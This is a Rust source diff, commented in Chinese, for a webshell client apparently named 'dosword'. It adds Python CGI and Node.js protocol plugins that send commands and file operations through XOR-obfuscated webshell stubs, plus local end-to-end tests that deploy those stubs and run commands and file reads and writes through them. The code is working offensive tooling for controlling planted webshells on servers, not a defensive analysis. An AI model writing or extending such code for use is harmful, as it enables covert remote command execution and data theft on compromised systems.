@@ -874,6 +874,129 @@ HTTPServer(("127.0.0.1", port), Hd).serve_forever()
     }
 
     #[test]
+    fn python_stub_round_trip_against_cgi_server() {
+        // 真实 python3 CGI 服务器 + PythonProtocol 端到端
+        if std::process::Command::new("python3").arg("--version").output().is_err() {
+            return;
+        }
+        let dir = std::env::temp_dir().join(format!("dosword-py-{}", uuid::Uuid::new_v4()));
+        let cgi = dir.join("cgi-bin");
+        std::fs::create_dir_all(&cgi).unwrap();
+        let stub = dosword_sdk::encoder::NativeEncoder { crypto: "xor" }
+            .stub("python", "secret")
+            .unwrap();
+        let script = cgi.join("shell.py");
+        std::fs::write(&script, &stub).unwrap();
+        // CGI 脚本需可执行
+        #[cfg(unix)]
+        {
+            use std::os::unix::fs::PermissionsExt;
+            let _ = std::fs::set_permissions(&script, std::fs::Permissions::from_mode(0o755));
+        }
+        let port = {
+            use std::net::TcpListener;
+            let listener = TcpListener::bind("127.0.0.1:0").unwrap();
+            listener.local_addr().unwrap().port()
+        };
+        let child = std::process::Command::new("python3")
+            .arg("-m")
+            .arg("http.server")
+            .arg("--cgi")
+            .arg(port.to_string())
+            .arg("--directory")
+            .arg(&dir)
+            .stdout(std::process::Stdio::null())
+            .stderr(std::process::Stdio::null())
+            .spawn();
+        let Some(mut child) = child.ok() else { return; };
+        std::thread::sleep(std::time::Duration::from_millis(700));
+        let url = format!("http://127.0.0.1:{port}/cgi-bin/shell.py");
+        let settings = settings();
+        let mut p = profile(&url);
+        p.protocol_id = "builtin.python.v1".into();
+        let protocol = PythonProtocol;
+        let result = (|| -> Result<(), ProtocolError> {
+            let (session, info) = protocol.connect(&p, &settings)?;
+            assert!(!info.current_dir.is_empty(), "Python probe 应返回当前目录");
+            assert!(info.runtime.contains("Python"), "runtime 应为 Python：{}", info.runtime);
+            eprintln!("[python] probe ok: {} / {}", info.runtime, info.current_dir);
+            let out = protocol.execute_command(session.as_ref(), "printf py-ok", &settings)?;
+            assert_eq!(out.stdout, "py-ok", "Python 命令执行应输出：{}", out.stdout);
+            eprintln!("[python] exec ok: {}", out.stdout);
+            let listing = protocol.list_dir(session.as_ref(), &dir.to_string_lossy(), &settings)?;
+            assert!(listing.entries.iter().any(|e| e.name == "cgi-bin"), "应列举出 cgi-bin");
+            eprintln!("[python] list ok（{} 项）", listing.entries.len());
+            // 文件写入 + 读取
+            let test_file = format!("{}/py_write.txt", dir.display());
+            protocol.write_file(session.as_ref(), &test_file, b"hello py", &settings)?;
+            let content = protocol.read_file(session.as_ref(), &test_file, &settings)?;
+            assert_eq!(content, b"hello py");
+            eprintln!("[python] read/write ok");
+            Ok(())
+        })();
+        let _ = child.kill();
+        let _ = child.wait();
+        let _ = std::fs::remove_dir_all(&dir);
+        result.unwrap_or_else(|error| panic!("Python stub 端到端应成功：{error}"));
+    }
+
+    #[test]
+    fn node_stub_round_trip_against_server() {
+        // 真实 node 服务 + NodeProtocol 端到端
+        if std::process::Command::new("node").arg("--version").output().is_err() {
+            eprintln!("跳过：无 node");
+            return;
+        }
+        let dir = std::env::temp_dir().join(format!("dosword-node-{}", uuid::Uuid::new_v4()));
+        std::fs::create_dir_all(&dir).unwrap();
+        let stub = dosword_sdk::encoder::NativeEncoder { crypto: "xor" }
+            .stub("node", "secret")
+            .unwrap();
+        let script = dir.join("shell.js");
+        std::fs::write(&script, &stub).unwrap();
+        let port = {
+            use std::net::TcpListener;
+            let listener = TcpListener::bind("127.0.0.1:0").unwrap();
+            listener.local_addr().unwrap().port()
+        };
+        let child = std::process::Command::new("node")
+            .arg(&script)
+            .env("PORT", port.to_string())
+            .current_dir(&dir)
+            .stdout(std::process::Stdio::null())
+            .stderr(std::process::Stdio::null())
+            .spawn();
+        let Some(mut child) = child.ok() else { return; };
+        std::thread::sleep(std::time::Duration::from_millis(700));
+        let url = format!("http://127.0.0.1:{port}/");
+        let settings = settings();
+        let mut p = profile(&url);
+        p.protocol_id = "builtin.node.v1".into();
+        let protocol = NodeProtocol;
+        let result = (|| -> Result<(), ProtocolError> {
+            let (session, info) = protocol.connect(&p, &settings)?;
+            assert!(info.runtime.contains("Node"), "Node probe runtime：{}", info.runtime);
+            eprintln!("[node] probe ok: {}", info.runtime);
+            let out = protocol.execute_command(session.as_ref(), "printf node-ok", &settings)?;
+            assert_eq!(out.stdout, "node-ok", "Node 命令执行应输出：{}", out.stdout);
+            eprintln!("[node] exec ok: {}", out.stdout);
+            let listing = protocol.list_dir(session.as_ref(), &dir.to_string_lossy(), &settings)?;
+            assert!(listing.entries.iter().any(|e| e.name == "shell.js"), "应列举出 shell.js");
+            eprintln!("[node] list ok（{} 项）", listing.entries.len());
+            let test_file = format!("{}/node_write.txt", dir.display());
+            protocol.write_file(session.as_ref(), &test_file, b"hello node", &settings)?;
+            let content = protocol.read_file(session.as_ref(), &test_file, &settings)?;
+            assert_eq!(content, b"hello node");
+            eprintln!("[node] read/write ok");
+            Ok(())
+        })();
+        let _ = child.kill();
+        let _ = child.wait();
+        let _ = std::fs::remove_dir_all(&dir);
+        result.unwrap_or_else(|error| panic!("Node stub 端到端应成功：{error}"));
+    }
+
+    #[test]
     fn jsp_stub_generates_for_all_crypto() {
         // JSP/ASP stub 生成（XOR 载荷）不应失败
         let stub = NativeEncoder { crypto: "xor" }.stub("jsp", "secret").unwrap();
@@ -881,5 +1004,265 @@ HTTPServer(("127.0.0.1", port), Hd).serve_forever()
         assert!(stub.contains("DSW_md5"));
         let aspx = NativeEncoder { crypto: "xor" }.stub("aspx", "secret").unwrap();
         assert!(aspx.contains("Process.Start"));
+    }
+}
+
+// ---------------------------------------------------------------------------
+// Python / Node.js：复用 JvmLikeProtocol 通信格式（formData XOR + X-Debug-Key）
+// ---------------------------------------------------------------------------
+
+pub struct PythonProtocol;
+
+impl Protocol for PythonProtocol {
+    fn id(&self) -> &'static str {
+        "builtin.python.v1"
+    }
+
+    fn display_name(&self) -> &'static str {
+        "Python（XOR 载荷）"
+    }
+
+    fn requires_network(&self) -> bool {
+        true
+    }
+
+    fn probe(
+        &self,
+        profile: &ShellProfile,
+        settings: &AppSettings,
+    ) -> Result<ProbeResult, ProtocolError> {
+        JvmLikeProtocol { id: "builtin.python.v1", display_name: "" }.probe(profile, settings)
+    }
+
+    fn connect(
+        &self,
+        profile: &ShellProfile,
+        settings: &AppSettings,
+    ) -> Result<(Box<dyn SessionState>, ProbeResult), ProtocolError> {
+        JvmLikeProtocol { id: "builtin.python.v1", display_name: "" }.connect(profile, settings)
+    }
+
+    fn execute_command(
+        &self,
+        session: &dyn SessionState,
+        command: &str,
+        settings: &AppSettings,
+    ) -> Result<CommandOutput, ProtocolError> {
+        JvmLikeProtocol { id: "builtin.python.v1", display_name: "" }
+            .execute_command(session, command, settings)
+    }
+
+    fn list_dir(
+        &self,
+        session: &dyn SessionState,
+        path: &str,
+        settings: &AppSettings,
+    ) -> Result<DirListing, ProtocolError> {
+        JvmLikeProtocol { id: "builtin.python.v1", display_name: "" }
+            .list_dir(session, path, settings)
+    }
+
+    fn read_file(
+        &self,
+        session: &dyn SessionState,
+        path: &str,
+        settings: &AppSettings,
+    ) -> Result<Vec<u8>, ProtocolError> {
+        JvmLikeProtocol { id: "builtin.python.v1", display_name: "" }
+            .read_file(session, path, settings)
+    }
+
+    fn write_file(
+        &self,
+        session: &dyn SessionState,
+        path: &str,
+        content: &[u8],
+        settings: &AppSettings,
+    ) -> Result<(), ProtocolError> {
+        JvmLikeProtocol { id: "builtin.python.v1", display_name: "" }
+            .write_file(session, path, content, settings)
+    }
+
+    fn delete_path(
+        &self,
+        session: &dyn SessionState,
+        path: &str,
+        settings: &AppSettings,
+    ) -> Result<(), ProtocolError> {
+        JvmLikeProtocol { id: "builtin.python.v1", display_name: "" }
+            .delete_path(session, path, settings)
+    }
+
+    fn rename_path(
+        &self,
+        session: &dyn SessionState,
+        from: &str,
+        to: &str,
+        settings: &AppSettings,
+    ) -> Result<(), ProtocolError> {
+        JvmLikeProtocol { id: "builtin.python.v1", display_name: "" }
+            .rename_path(session, from, to, settings)
+    }
+
+    fn create_dir(
+        &self,
+        session: &dyn SessionState,
+        path: &str,
+        settings: &AppSettings,
+    ) -> Result<(), ProtocolError> {
+        JvmLikeProtocol { id: "builtin.python.v1", display_name: "" }
+            .create_dir(session, path, settings)
+    }
+
+    fn touch_path(
+        &self,
+        session: &dyn SessionState,
+        path: &str,
+        timestamp: u64,
+        settings: &AppSettings,
+    ) -> Result<(), ProtocolError> {
+        JvmLikeProtocol { id: "builtin.python.v1", display_name: "" }
+            .touch_path(session, path, timestamp, settings)
+    }
+}
+
+impl dosword_sdk::ProtocolPlugin for PythonProtocol {
+    fn manifest(&self) -> dosword_sdk::PluginManifest {
+        dosword_sdk::PluginManifest {
+            id: self.id().to_string(),
+            name: self.display_name().to_string(),
+            version: env!("CARGO_PKG_VERSION").to_string(),
+            kind: dosword_sdk::PluginKind::Protocol,
+            description: "Python WebShell（CGI）：命令执行、文件管理（XOR 载荷）。".to_string(),
+            capabilities: vec!["files".into(), "terminal".into()],
+        }
+    }
+}
+
+pub struct NodeProtocol;
+
+impl Protocol for NodeProtocol {
+    fn id(&self) -> &'static str {
+        "builtin.node.v1"
+    }
+
+    fn display_name(&self) -> &'static str {
+        "Node.js（XOR 载荷）"
+    }
+
+    fn requires_network(&self) -> bool {
+        true
+    }
+
+    fn probe(
+        &self,
+        profile: &ShellProfile,
+        settings: &AppSettings,
+    ) -> Result<ProbeResult, ProtocolError> {
+        JvmLikeProtocol { id: "builtin.node.v1", display_name: "" }.probe(profile, settings)
+    }
+
+    fn connect(
+        &self,
+        profile: &ShellProfile,
+        settings: &AppSettings,
+    ) -> Result<(Box<dyn SessionState>, ProbeResult), ProtocolError> {
+        JvmLikeProtocol { id: "builtin.node.v1", display_name: "" }.connect(profile, settings)
+    }
+
+    fn execute_command(
+        &self,
+        session: &dyn SessionState,
+        command: &str,
+        settings: &AppSettings,
+    ) -> Result<CommandOutput, ProtocolError> {
+        JvmLikeProtocol { id: "builtin.node.v1", display_name: "" }
+            .execute_command(session, command, settings)
+    }
+
+    fn list_dir(
+        &self,
+        session: &dyn SessionState,
+        path: &str,
+        settings: &AppSettings,
+    ) -> Result<DirListing, ProtocolError> {
+        JvmLikeProtocol { id: "builtin.node.v1", display_name: "" }
+            .list_dir(session, path, settings)
+    }
+
+    fn read_file(
+        &self,
+        session: &dyn SessionState,
+        path: &str,
+        settings: &AppSettings,
+    ) -> Result<Vec<u8>, ProtocolError> {
+        JvmLikeProtocol { id: "builtin.node.v1", display_name: "" }
+            .read_file(session, path, settings)
+    }
+
+    fn write_file(
+        &self,
+        session: &dyn SessionState,
+        path: &str,
+        content: &[u8],
+        settings: &AppSettings,
+    ) -> Result<(), ProtocolError> {
+        JvmLikeProtocol { id: "builtin.node.v1", display_name: "" }
+            .write_file(session, path, content, settings)
+    }
+
+    fn delete_path(
+        &self,
+        session: &dyn SessionState,
+        path: &str,
+        settings: &AppSettings,
+    ) -> Result<(), ProtocolError> {
+        JvmLikeProtocol { id: "builtin.node.v1", display_name: "" }
+            .delete_path(session, path, settings)
+    }
+
+    fn rename_path(
+        &self,
+        session: &dyn SessionState,
+        from: &str,
+        to: &str,
+        settings: &AppSettings,
+    ) -> Result<(), ProtocolError> {
+        JvmLikeProtocol { id: "builtin.node.v1", display_name: "" }
+            .rename_path(session, from, to, settings)
+    }
+
+    fn create_dir(
+        &self,
+        session: &dyn SessionState,
+        path: &str,
+        settings: &AppSettings,
+    ) -> Result<(), ProtocolError> {
+        JvmLikeProtocol { id: "builtin.node.v1", display_name: "" }
+            .create_dir(session, path, settings)
+    }
+
+    fn touch_path(
+        &self,
+        session: &dyn SessionState,
+        path: &str,
+        timestamp: u64,
+        settings: &AppSettings,
+    ) -> Result<(), ProtocolError> {
+        JvmLikeProtocol { id: "builtin.node.v1", display_name: "" }
+            .touch_path(session, path, timestamp, settings)
+    }
+}
+
+impl dosword_sdk::ProtocolPlugin for NodeProtocol {
+    fn manifest(&self) -> dosword_sdk::PluginManifest {
+        dosword_sdk::PluginManifest {
+            id: self.id().to_string(),
+            name: self.display_name().to_string(),
+            version: env!("CARGO_PKG_VERSION").to_string(),
+            kind: dosword_sdk::PluginKind::Protocol,
+            description: "Node.js WebShell（独立 HTTP 服务）：命令执行、文件管理（XOR 载荷）。".to_string(),
+            capabilities: vec!["files".into(), "terminal".into()],
+        }
     }
 }
